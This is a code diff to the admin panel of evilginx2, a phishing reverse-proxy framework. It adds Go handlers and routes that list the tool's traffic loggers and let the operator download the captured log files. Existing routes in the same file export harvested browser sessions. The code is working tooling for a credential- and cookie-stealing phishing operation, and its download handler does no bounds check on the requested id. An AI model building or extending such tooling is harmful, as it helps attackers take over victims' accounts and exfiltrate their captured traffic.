@@ -1,22 +1,23 @@
 package core
 
 import (
-	"github.com/gorilla/mux"
-	"net/http"
-	"time"
-	"strings"
-	"strconv"
 	"fmt"
 	"io/ioutil"
+	"net/http"
+	"strconv"
+	"strings"
+	"time"
+
+	"github.com/gorilla/mux"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 )
 
 type AdminPanel struct {
-	srv        *http.Server
-	cfg        *Config
-	db         *database.Database
+	srv *http.Server
+	cfg *Config
+	db  *database.Database
 }
 
 func (a *AdminPanel) handleSessions(w http.ResponseWriter, r *http.Request) {
@@ -99,6 +100,66 @@ func (a *AdminPanel) downloadSession(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+func (a *AdminPanel) handleLogs(w http.ResponseWriter, r *http.Request) {
+	log.Debug("Starting handleLogs")
+
+	var body string
+	var logdownloadlink string
+
+	//terminal.go 339
+
+	if len(a.cfg.trafficloggers) == 0 {
+		body = "No saved Sessions found"
+	} else {
+		cols := []string{"id", "enabled", "type", "filename", "delimiter", "no of Entries", "filesize", "downloadlink"}
+		var rows [][]string
+		for i, l := range a.cfg.trafficloggers {
+			logdownloadlink = "<a href='./logs/download/" + strconv.Itoa(i) + "'>Download</a>"
+			rows = append(rows, []string{strconv.Itoa(i), strconv.FormatBool(l.Enabled), l.Type, l.Filename, string(l.Delimiter), strconv.Itoa(l.getEntrysize()), HumanFileSize(l.getFilesize()), logdownloadlink})
+		}
+
+		body = AsHTMLTable(cols, rows)
+	}
+
+	b, _ := ioutil.ReadFile("./templates/adminpanel_basic.html")
+	html := fmt.Sprintf(string(b), "Loggers", body)
+
+	w.WriteHeader(http.StatusOK)
+	w.Header().Set("content-type", "text/html")
+	w.Write([]byte(html))
+}
+
+func (a *AdminPanel) downloadLog(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	id, _ := strconv.Atoi(vars["id"])
+
+	log.Debug("Admin Panel Request to download Log %d", id)
+
+	trafficlogger := a.cfg.trafficloggers[id]
+	if trafficlogger == nil {
+		w.WriteHeader(http.StatusNotFound)
+		w.Header().Set("content-type", "text/plain")
+		w.Write([]byte("Session not found"))
+		return
+	}
+
+	filename := trafficlogger.Filename
+
+	content, err := ioutil.ReadFile("/app/log/" + filename)
+	if err != nil {
+		log.Error("downloadLog() error in ioutil.ReadFile: %s", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		w.Header().Set("content-type", "text/plain")
+		w.Write([]byte("Internal Error when opening file, plase look at system log"))
+		return
+	}
+
+	w.WriteHeader(http.StatusOK)
+	w.Header().Set("content-type", "text/csv")
+	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
+	w.Write(content)
+}
+
 func (a *AdminPanel) handleStatus(w http.ResponseWriter, r *http.Request) {
 	log.Debug("Starting handleStatus")
 
@@ -138,6 +199,8 @@ func NewAdminPanel(cfg *Config, db *database.Database) (*AdminPanel, error) {
 	})
 	r.HandleFunc("/sessions", a.handleSessions)
 	r.HandleFunc("/sessions/download/{id}/{browser}", a.downloadSession) //possible options for browser are "Ff" or "Chromium"
+	r.HandleFunc("/logs", a.handleLogs)
+	r.HandleFunc("/logs/download/{id}", a.downloadLog)
 	r.HandleFunc("/status", a.handleStatus)
 
 	return a, nil
